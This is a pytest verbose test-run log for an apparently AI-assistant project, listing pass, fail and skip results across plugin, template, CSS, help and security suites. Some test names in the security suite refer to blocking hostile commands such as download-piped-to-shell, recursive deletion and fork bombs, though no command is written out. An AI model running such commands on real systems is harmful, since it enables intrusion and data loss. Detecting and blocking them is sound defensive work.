tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshPluginInitialization::test_plugin_config_schema PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshPluginInitialization::test_plugin_initialization_success PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshPluginInitialization::test_plugin_initialization_creates_story_dir PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshExecution::test_execute_doc_refresh_hook PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshExecution::test_execute_self_review_hook PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshExecution::test_execute_unknown_hook PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshExecution::test_refresh_all_docs_includes_six_documents PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_story_refresh_full_regeneration FAILED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_story_refresh_file_not_exists_error FAILED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_progressive_recap_generation PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_lab_notebook_condensation FAILED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestVoiceTransformation::test_voice_transformation_detection PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestVoiceTransformation::test_voice_transformation_suggestions PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestVoiceTransformation::test_complete_narrator_analysis PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestReadTimeValidation::test_read_time_validation_within_target PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestReadTimeValidation::test_read_time_validation_too_long PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestReadTimeValidation::test_read_time_validation_too_short PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestCompleteStoryRegeneration::test_feature_inventory_extraction PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestCompleteStoryRegeneration::test_deprecated_section_detection PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestCompleteStoryRegeneration::test_story_structure_building PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestCompleteStoryRegeneration::test_consistency_validation PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestAncientRulesRefresh::test_ancient_rules_refresh_success PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestAncientRulesRefresh::test_ancient_rules_file_not_exists_error PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestAncientRulesRefresh::test_ancient_rules_yaml_not_found PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestFeaturesDocRefresh::test_features_refresh_success PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestFeaturesDocRefresh::test_features_doc_file_not_exists_error PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestFeaturesDocRefresh::test_features_categorization PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestNarrativeFlowAnalysis::test_narrative_flow_analysis_three_act PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestNarrativeFlowAnalysis::test_narrative_flow_warnings PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestBackupAndSafety::test_backup_creation PASSED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestBackupAndSafety::test_no_file_creation_enforcement FAILED [ 42%]
tests/plugins/test_doc_refresh_plugin.py::TestDocSyncValidation::test_doc_sync_check_up_to_date PASSED [ 43%]
tests/plugins/test_doc_refresh_plugin.py::TestDocSyncValidation::test_doc_sync_check_out_of_sync PASSED [ 43%]
tests/plugins/test_doc_refresh_plugin.py::TestPluginIntegration::test_plugin_cleanup PASSED [ 43%]
tests/plugins/test_doc_refresh_plugin.py::TestPluginIntegration::test_plugin_lifecycle PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionScaffoldInitialization::test_plugin_creation PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionScaffoldInitialization::test_plugin_metadata PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionScaffoldInitialization::test_plugin_hooks PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionScaffoldInitialization::test_plugin_config_schema PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionScaffoldInitialization::test_plugin_initialization_success PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionGeneration::test_execute_extension_scaffold_success FAILED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionGeneration::test_execute_extension_scaffold_dir_exists_error PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestExtensionGeneration::test_execute_with_custom_features FAILED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestDirectoryStructureGeneration::test_directory_structure_creation FAILED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestDirectoryStructureGeneration::test_directory_structure_nested_creation PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestPackageJsonGeneration::test_package_json_generation PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestPackageJsonGeneration::test_package_json_has_chat_participant PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestPackageJsonGeneration::test_package_json_has_commands PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestTypeScriptGeneration::test_extension_ts_generation PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestTypeScriptGeneration::test_extension_ts_includes_features PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestTypeScriptGeneration::test_chat_participant_ts_generation PASSED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestTypeScriptGeneration::test_brain_bridge_ts_generation FAILED [ 43%]
tests/plugins/test_extension_scaffold_plugin.py::TestPythonBridgeGeneration::test_python_bridge_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestPythonBridgeGeneration::test_python_bridge_has_all_handlers PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestConfigurationGeneration::test_tsconfig_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestConfigurationGeneration::test_vscodeignore_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestConfigurationGeneration::test_gitignore_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestDocumentationGeneration::test_readme_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestDocumentationGeneration::test_changelog_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestScriptGeneration::test_build_script_generation PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestScriptGeneration::test_build_script_executable PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestFeatureToggling::test_minimal_features FAILED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestFeatureToggling::test_full_features FAILED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestErrorHandling::test_execute_handles_io_error PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestErrorHandling::test_execute_with_missing_context FAILED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestPluginIntegration::test_plugin_cleanup PASSED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestPluginIntegration::test_plugin_lifecycle FAILED [ 44%]
tests/plugins/test_extension_scaffold_plugin.py::TestPluginIntegration::test_generated_extension_structure FAILED [ 44%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestImplicitPartDetection::test_detects_explicit_parts_only PASSED [ 44%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestImplicitPartDetection::test_detects_implicit_part_1 PASSED [ 44%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestImplicitPartDetection::test_detects_implicit_part_with_interludes PASSED [ 44%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestImplicitPartDetection::test_no_implicit_part_when_starts_with_explicit PASSED [ 44%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestImplicitPartDetection::test_only_one_explicit_part_with_chapters_before PASSED [ 44%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestStructureClassification::test_three_act_structure PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestStructureClassification::test_multi_part_structure PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestStructureClassification::test_single_narrative_no_parts PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestStructureClassification::test_implicit_part_affects_structure_classification PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestInterludeToPartRatioValidation::test_balanced_interludes_and_parts PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestInterludeToPartRatioValidation::test_more_interludes_than_parts_warns PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestInterludeToPartRatioValidation::test_implicit_part_prevents_false_positive_warning PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestEdgeCases::test_empty_story PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestEdgeCases::test_only_intro_no_chapters_or_parts PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestEdgeCases::test_case_insensitive_part_detection PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestEdgeCases::test_part_in_middle_of_line PASSED [ 45%]
tests/plugins/test_narrative_flow_implicit_parts.py::TestRecommendedFix::test_recommended_implementation_pattern PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestPlatformDetection::test_detect_current_platform PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestPlatformDetection::test_platform_display_names PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestPlatformDetection::test_platform_config_creation PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestAutomaticPlatformChange::test_first_time_setup_no_state_file PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestAutomaticPlatformChange::test_save_and_load_platform_state PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestAutomaticPlatformChange::test_platform_change_detected PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestAutomaticPlatformChange::test_no_change_same_platform PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestAutoConfiguration::test_auto_configure_runs_on_platform_change PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestAutoConfiguration::test_auto_configure_lightweight PASSED [ 45%]
tests/plugins/test_platform_auto_detection.py::TestManualSetup::test_setup_command_registered PASSED [ 46%]
tests/plugins/test_platform_auto_detection.py::TestManualSetup::test_no_platform_specific_commands PASSED [ 46%]
tests/plugins/test_platform_auto_detection.py::TestManualSetup::test_setup_aliases_present PASSED [ 46%]
tests/plugins/test_platform_auto_detection.py::TestPluginInitialization::test_initialize_checks_platform PASSED [ 46%]
tests/plugins/test_platform_auto_detection.py::TestDependencyCheck::test_check_dependencies_exist PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_detects_current_platform PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_platform_display_names PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_mac_detection_from_request FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_windows_detection_from_request FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_linux_detection_from_request FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformConfig::test_mac_config PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformConfig::test_windows_config PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPlatformConfig::test_linux_config PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPluginInitialization::test_plugin_creates_successfully FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPluginInitialization::test_plugin_finds_project_root PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestPluginInitialization::test_plugin_has_triggers FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestTriggerDetection::test_can_handle_mac_requests FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestTriggerDetection::test_can_handle_windows_requests FAILED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestTriggerDetection::test_does_not_handle_unrelated_requests PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestGitOperations::test_git_pull_success PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestGitOperations::test_git_pull_failure PASSED [ 46%]
tests/plugins/test_platform_switch_plugin.py::TestGitOperations::test_count_git_changes PASSED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestEnvironmentConfiguration::test_configures_mac_environment SKIPPED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestEnvironmentConfiguration::test_creates_venv_if_missing SKIPPED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestDependencyVerification::test_verifies_installed_packages PASSED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestDependencyVerification::test_get_venv_python_mac FAILED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestDependencyVerification::test_get_venv_python_windows PASSED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestBrainTests::test_runs_brain_tests FAILED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestBrainTests::test_handles_test_failures FAILED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestToolingVerification::test_verifies_git PASSED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestEndToEnd::test_plugin_validates PASSED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestEndToEnd::test_full_execution_flow FAILED [ 47%]
tests/plugins/test_platform_switch_plugin.py::TestEndToEnd::test_generates_summary PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestPluginInitialization::test_plugin_creates_successfully PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestPluginInitialization::test_plugin_has_correct_metadata PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestPluginInitialization::test_plugin_registers_commands FAILED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestPluginInitialization::test_plugin_handles_refactor_requests PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestPluginInitialization::test_plugin_ignores_unrelated_requests PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestCriticalReview::test_review_analyzes_test_suite PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestCriticalReview::test_review_assesses_system_health PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestCriticalReview::test_review_analyzes_test_categories PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestGapAnalysis::test_gap_analysis_checks_plugin_coverage PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestGapAnalysis::test_gap_analysis_checks_entry_point_coverage PASSED [ 47%]
tests/plugins/test_system_refactor_plugin.py::TestGapAnalysis::test_gap_analysis_checks_refactor_phase PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestGapAnalysis::test_gap_analysis_checks_module_coverage PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestGapAnalysis::test_gap_analysis_checks_performance_coverage PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestRefactorPhaseExecution::test_refactor_parses_tasks_from_test_files PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestRefactorPhaseExecution::test_refactor_identifies_pending_tasks PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestRecommendations::test_recommendations_for_critical_health PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestRecommendations::test_recommendations_for_coverage_gaps PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestRecommendations::test_recommendations_for_refactor_tasks PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestReporting::test_report_saves_to_brain PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestReporting::test_report_formats_as_markdown FAILED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestReporting::test_summary_formats_correctly PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestPluginExecution::test_plugin_executes_full_workflow PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestPluginExecution::test_plugin_handles_execution_errors FAILED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestPluginCleanup::test_plugin_cleans_up_successfully PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestPluginIntegration::test_plugin_registers_successfully PASSED [ 48%]
tests/plugins/test_system_refactor_plugin.py::TestPluginIntegration::test_plugin_works_with_command_registry PASSED [ 48%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_loader_renderer_pipeline PASSED [ 48%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_loader_registry_integration PASSED [ 48%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_trigger_to_rendered_output PASSED [ 48%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_response_formatter_template_integration PASSED [ 48%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_response_formatter_trigger_lookup PASSED [ 48%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_response_formatter_fallback_when_no_templates PASSED [ 49%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_plugin_template_registration PASSED [ 49%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_list_available_templates PASSED [ 49%]
tests/response_templates/test_integration.py::TestTemplateSystemIntegration::test_list_templates_by_category PASSED [ 49%]
tests/response_templates/test_integration.py::TestPerformance::test_template_load_performance PASSED [ 49%]
tests/response_templates/test_integration.py::TestPerformance::test_template_render_performance PASSED [ 49%]
tests/response_templates/test_integration.py::TestPerformance::test_trigger_lookup_performance FAILED [ 49%]
tests/response_templates/test_integration.py::TestPerformance::test_end_to_end_performance PASSED [ 49%]
tests/response_templates/test_integration.py::TestRealWorldScenarios::test_help_command_workflow PASSED [ 49%]
tests/response_templates/test_integration.py::TestRealWorldScenarios::test_agent_success_workflow PASSED [ 49%]
tests/response_templates/test_integration.py::TestRealWorldScenarios::test_error_reporting_workflow PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_render_simple_template PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_render_missing_placeholder PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_render_with_none_context PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_render_with_empty_context PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_render_with_kwargs PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_verbosity_concise PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_verbosity_detailed PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_verbosity_expert PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_verbosity_invalid_defaults_to_concise PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_conditional_with_true_condition PASSED [ 49%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_conditional_with_false_condition PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_conditional_with_false_value PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_loop_rendering PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_loop_with_empty_list PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_loop_with_missing_list PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_convert_format_json PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_convert_format_text PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_convert_format_markdown PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_complex_template_with_all_features PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_apply_verbosity_removes_other_sections PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_placeholder_substitution_with_nested_dict PASSED [ 50%]
tests/response_templates/test_template_renderer.py::TestTemplateRenderer::test_render_strips_whitespace PASSED [ 50%]
tests/scripts/test_plan_cli.py::test_create_feature_plan_creates_yaml_file PASSED [ 50%]
tests/test_ambient_security.py::TestPathTraversalProtection::test_blocks_parent_directory_traversal PASSED [ 50%]
tests/test_ambient_security.py::TestPathTraversalProtection::test_blocks_absolute_path_outside_workspace PASSED [ 50%]
tests/test_ambient_security.py::TestPathTraversalProtection::test_allows_valid_workspace_paths PASSED [ 50%]
tests/test_ambient_security.py::TestPathTraversalProtection::test_resolves_symlinks_and_validates PASSED [ 50%]
tests/test_ambient_security.py::TestCommandInjectionPrevention::test_git_hook_type_whitelist PASSED [ 50%]
tests/test_ambient_security.py::TestCommandInjectionPrevention::test_git_hook_script_uses_absolute_paths PASSED [ 50%]
tests/test_ambient_security.py::TestCommandInjectionPrevention::test_subprocess_uses_list_args PASSED [ 50%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_blocks_rm_rf_commands PASSED [ 50%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_blocks_eval_commands PASSED [ 51%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_blocks_curl_pipe_sh PASSED [ 51%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_blocks_fork_bombs PASSED [ 51%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_sanitizes_passwords_in_commands PASSED [ 51%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_sanitizes_tokens_in_commands PASSED [ 51%]
tests/test_ambient_security.py::TestMaliciousPatternDetection::test_allows_safe_commands PASSED [ 51%]
tests/test_ambient_security.py::TestInputValidation::test_rejects_oversized_files PASSED [ 51%]
tests/test_ambient_security.py::TestInputValidation::test_rejects_long_commands PASSED [ 51%]
tests/test_ambient_security.py::TestInputValidation::test_validates_file_extensions PASSED [ 51%]
tests/test_ambient_security.py::TestInputValidation::test_limits_vscode_file_list PASSED [ 51%]
tests/test_ambient_security.py::TestInputValidation::test_validates_json_structure PASSED [ 51%]
tests/test_ambient_security.py::TestWorkspaceBoundaryEnforcement::test_terminal_history_must_be_in_workspace PASSED [ 51%]
tests/test_ambient_security.py::TestWorkspaceBoundaryEnforcement::test_git_repo_must_be_valid_directory PASSED [ 51%]
tests/test_ambient_security.py::TestWorkspaceBoundaryEnforcement::test_file_watcher_only_monitors_workspace PASSED [ 51%]
tests/test_ambient_security.py::TestSecureErrorHandling::test_does_not_expose_paths_in_errors PASSED [ 51%]
tests/test_ambient_security.py::TestSecureErrorHandling::test_git_hook_failures_are_silent PASSED [ 51%]
tests/test_ambient_security.py::TestSecurityConstants::test_file_size_limit_defined PASSED [ 51%]
tests/test_ambient_security.py::TestSecurityConstants::test_command_length_limit_defined PASSED [ 51%]
tests/test_ambient_security.py::TestSecurityConstants::test_dangerous_patterns_defined PASSED [ 51%]
tests/test_cortex_help.py::TestHelpGeneration::test_concise_help_generates FAILED [ 51%]
tests/test_cortex_help.py::TestHelpGeneration::test_concise_help_has_bullets FAILED [ 51%]
tests/test_cortex_help.py::TestHelpGeneration::test_concise_help_shows_natural_language FAILED [ 52%]
tests/test_cortex_help.py::TestHelpGeneration::test_detailed_help_generates FAILED [ 52%]
tests/test_cortex_help.py::TestHelpGeneration::test_detailed_help_has_examples FAILED [ 52%]
tests/test_cortex_help.py::TestHelpGeneration::test_category_help_generates FAILED [ 52%]
tests/test_cortex_help.py::TestHelpGeneration::test_category_help_has_table FAILED [ 52%]
tests/test_cortex_help.py::TestCategoryFiltering::test_platform_commands_only FAILED [ 52%]
tests/test_cortex_help.py::TestCategoryFiltering::test_session_commands_only PASSED [ 52%]
tests/test_cortex_help.py::TestQuickReference::test_quick_reference_generates PASSED [ 52%]
tests/test_cortex_help.py::TestQuickReference::test_quick_reference_is_concise FAILED [ 52%]
tests/test_cortex_help.py::TestQuickReference::test_quick_reference_has_essentials PASSED [ 52%]
tests/test_cortex_help.py::TestIntelligentHandling::test_handles_detailed_request FAILED [ 52%]
tests/test_cortex_help.py::TestIntelligentHandling::test_handles_quick_request PASSED [ 52%]
tests/test_cortex_help.py::TestIntelligentHandling::test_handles_category_request FAILED [ 52%]
tests/test_cortex_help.py::TestIntelligentHandling::test_handles_generic_request FAILED [ 52%]
tests/test_cortex_help.py::TestIntelligentHandling::test_defaults_to_concise FAILED [ 52%]
tests/test_cortex_help.py::TestConvenienceFunctions::test_cortex_help_function FAILED [ 52%]
tests/test_cortex_help.py::TestConvenienceFunctions::test_cortex_help_is_concise FAILED [ 52%]
tests/test_cortex_help.py::TestHelpIntegration::test_includes_registered_commands FAILED [ 52%]
tests/test_cortex_help.py::TestHelpIntegration::test_shows_command_stats FAILED [ 52%]
tests/test_cortex_help.py::TestHelpIntegration::test_handles_empty_category PASSED [ 52%]
tests/test_cortex_help.py::TestHelpFormatting::test_concise_uses_markdown FAILED [ 52%]
tests/test_cortex_help.py::TestHelpFormatting::test_has_clear_sections FAILED [ 52%]
tests/test_cortex_help.py::TestHelpFormatting::test_readable_line_length FAILED [ 53%]
tests/test_css_browser_loading.py::TestCSSCacheBusting::test_css_file_hash PASSED [ 53%]
tests/test_css_browser_loading.py::TestCSSCacheBusting::test_css_specificity_check PASSED [ 53%]
tests/test_css_browser_loading.py::TestCSSCacheBusting::test_css_load_order PASSED [ 53%]
tests/test_css_browser_loading.py::TestVisualDebugging::test_generate_css_snippet PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_css_file_exists PASSED     [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_sidebar_gradient_background PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_navigation_link_color PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_active_link_purple_gradient PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_main_title_gradient PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_brain_emoji_in_title PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_code_block_dark_grey PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_hover_effect_purple PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_navigation_title_style PASSED [ 53%]
tests/test_css_styles.py::TestCSSStyles::test_no_pure_black_in_navigation PASSED [ 53%]
tests/test_css_styles.py::TestHTMLIntegration::test_html_file_exists PASSED [ 53%]
tests/test_css_styles.py::TestHTMLIntegration::test_custom_css_linked PASSED [ 53%]
tests/test_css_styles.py::TestHTMLIntegration::test_google_fonts_loaded PASSED [ 53%]
tests/test_css_styles.py::TestColorConsistency::test_cortex_primary_color_defined PASSED [ 53%]
tests/test_css_styles.py::TestColorConsistency::test_cortex_accent_color_defined PASSED [ 53%]
tests/test_css_styles.py::TestColorConsistency::test_color_variables_used PASSED [ 53%]
tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_tier0_rules_immutable FAILED [ 54%]
tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_tier0_read_only_enforcement FAILED [ 54%]
tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_challenge_generation_for_risky_change FAILED [ 54%]
tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_rollback_mechanism_on_violation FAILED [ 54%]
tests/test_risk_mitigation.py::TestBrainProtectorBoundaries::test_tier_write_boundaries FAILED [ 54%]
tests/test_risk_mitigation.py::TestBrainProtectorBoundaries::test_tier_read_permissions FAILED [ 54%]
tests/test_risk_mitigation.py::TestWorkflowDAGValidation::test_detect_circular_dependency PASSED [ 54%]
tests/test_risk_mitigation.py::TestWorkflowDAGValidation::test_detect_missing_dependency PASSED [ 54%]
tests/test_risk_mitigation.py::TestWorkflowDAGValidation::test_valid_dag_topology PASSED [ 54%]
tests/test_risk_mitigation.py::TestWorkflowStageExecution::test_required_stage_failure_aborts_workflow PASSED [ 54%]
tests/test_risk_mitigation.py::TestWorkflowStageExecution::test_optional_stage_failure_continues PASSED [ 54%]
tests/test_risk_mitigation.py::TestWorkflowStageExecution::test_retry_logic_exhaustion PASSED [ 54%]
tests/test_risk_mitigation.py::TestDatabaseIntegrity::test_tier1_schema_integrity FAILED [ 54%]
tests/test_risk_mitigation.py::TestDatabaseIntegrity::test_tier2_fts5_integrity FAILED [ 54%]
tests/test_risk_mitigation.py::TestDatabaseIntegrity::test_foreign_key_constraints FAILED [ 54%]
tests/test_risk_mitigation.py::TestMigrationIntegrity::test_migration_rollback_on_error PASSED [ 54%]
tests/test_risk_mitigation.py::TestMigrationIntegrity::test_migration_idempotency PASSED [ 54%]
tests/test_risk_mitigation.py::TestSTRIDEThreatDetection::test_detect_spoofing_threat PASSED [ 54%]
tests/test_risk_mitigation.py::TestSTRIDEThreatDetection::test_detect_information_disclosure PASSED [ 54%]
tests/test_risk_mitigation.py::TestSTRIDEThreatDetection::test_high_risk_triggers_security_review PASSED [ 54%]
tests/test_risk_mitigation.py::TestInputSanitization::test_sql_injection_prevention FAILED [ 54%]
